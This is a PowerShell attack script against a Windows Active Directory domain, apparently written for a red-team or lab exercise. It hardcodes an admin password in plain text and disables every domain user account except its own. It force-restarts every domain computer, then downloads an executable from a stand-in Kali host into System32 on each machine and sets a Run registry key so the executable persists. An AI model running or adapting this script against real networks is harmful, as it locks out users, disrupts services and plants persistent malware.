$pass = ConvertTo-SecureString "Sn3akyP@55" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DCO\BADMIN", $pass)

$hostnames = @()
$users = @()

Get-ADComputer -Filter * | Where-Object { $_.Name -ne "CI-SERVICE-WIN2" } | ForEach-Object { $hostnames += $_.Name }
Get-ADUser -Filter * -Properties Name | Select-Object -ExpandProperty Name | Where-Object { $_ -ne "BADMIN" } | ForEach-Object { $users += $_ }

Write-Host "Printing Names for Stager Creations..."
Write-Host " "
$hostnames | ForEach-Object { Write-Host $_ }
Write-Host " "
Write-Host " "
Write-Host "Waiting For User Input..."
Read-Host

Write-Host "Performing Attack...."
$users | ForEach-Object { Disable-ADAccount -Credential $cred -Identity $_ }
$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock { Restart-Computer -Force } }

Write-Host "Press Enter To Continue Attack"
Read-Host

$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock {
        $url = "http://{kali}:8000/"
        $hostname = $env:computername
        $outFile = "C:\Windows\System32\" + $hostname + ".exe"

        Invoke-WebRequest -Uri "$($url+$hostname).exe" -UseBasicParsing -OutFile $outFile
        $registeryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $registeryValue = "cmd.exe /c $($outFile)"
        Set-ItemProperty -Path $registeryPath -Name "critical" -Value $registeryValue
}}

Write-Host "Attack Complete"
